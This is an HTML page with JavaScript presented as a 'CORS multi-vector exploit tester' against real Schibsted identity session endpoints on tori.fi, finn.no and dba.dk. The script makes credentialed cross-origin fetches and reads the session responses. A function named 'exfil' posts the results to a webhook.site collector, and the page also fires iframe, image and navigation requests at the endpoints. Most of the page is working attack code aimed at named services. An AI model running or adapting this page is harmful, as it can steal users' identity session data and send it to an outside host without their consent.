<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Schibsted Identity CORS Multi-Vector Tester</title>

<style>
body {
    font-family: Arial;
    background: #f4f4f4;
    padding: 20px;
}

h1 {
    color: #c62828;
}

button {
    padding: 14px 20px;
    font-size: 16px;
    background: #c62828;
    color: white;
    border: none;
    cursor: pointer;
}

pre {
    background: #111;
    color: #0f0;
    padding: 15px;
    max-height: 500px;
    overflow: auto;
}

iframe {
    width: 100%;
    height: 200px;
    border: 1px solid #ccc;
    margin-top: 10px;
}
</style>

</head>

<body>

<h1>🔐 Identity CORS Multi-Vector Exploit Tester</h1>

<p>
Tests multiple browser behaviors against identity session endpoints.
</p>

<button onclick="runAllTests()">
🚨 Run All Tests
</button>

<pre id="output"></pre>

<div id="iframeContainer"></div>

<script>

/* =========================
   CONFIG
========================= */

const WEBHOOK =
"https://webhook.site/YOUR-ID";

const ENDPOINTS = [

"https://id.tori.fi/v2/session?client_sdrn=sdrn%3Aschibsted.fi%3Aclient%3A650421cf50eeae31ecd2a2d3",

"https://id.finn.no/v2/session",

"https://id.dba.dk/v2/session"

];


/* =========================
   LOGGER
========================= */

function log(msg) {

document.getElementById("output").textContent +=
msg + "\n";

}


/* =========================
   MASTER RUNNER
========================= */

async function runAllTests() {

log("Starting multi-vector testing...\n");

for (const endpoint of ENDPOINTS) {

await fetchTest(endpoint);

iframeTest(endpoint);

imageTest(endpoint);

navigationTest(endpoint);

}

log("\nAll tests triggered.");

}


/* =========================
   FETCH TEST
========================= */

async function fetchTest(endpoint) {

log("=== FETCH TEST ===");

log(endpoint);

try {

const response = await fetch(endpoint, {

method: "GET",

credentials: "include"

});

const text =
await response.text();

const corsOrigin =
response.headers.get(
"Access-Control-Allow-Origin"
);

const corsCreds =
response.headers.get(
"Access-Control-Allow-Credentials"
);

const result = {

endpoint: endpoint,

method: "fetch",

status: response.status,

cors_origin: corsOrigin,

cors_credentials: corsCreds,

response_preview:
text.substring(0, 300)

};

log(JSON.stringify(result, null, 2));

await exfil(result);

}
catch (e) {

log("Fetch error: " + e.message);

}

}


/* =========================
   IFRAME TEST
========================= */

function iframeTest(endpoint) {

log("=== IFRAME TEST ===");

const iframe =
document.createElement("iframe");

iframe.src = endpoint;

document
.getElementById("iframeContainer")
.appendChild(iframe);

}


/* =========================
   IMAGE TEST
========================= */

function imageTest(endpoint) {

log("=== IMAGE TEST ===");

const img =
new Image();

img.src = endpoint;

}


/* =========================
   NAVIGATION TEST
========================= */

function navigationTest(endpoint) {

log("=== NAVIGATION TEST ===");

setTimeout(() => {

log("Navigating to:");

log(endpoint);

window.location = endpoint;

}, 8000);

}


/* =========================
   WEBHOOK EXFIL
========================= */

async function exfil(data) {

try {

await fetch(WEBHOOK, {

method: "POST",

headers: {

"Content-Type":
"application/json"

},

body: JSON.stringify(data)

});

}
catch (e) {

log("Webhook failed.");

}

}

</script>

</body>
</html>
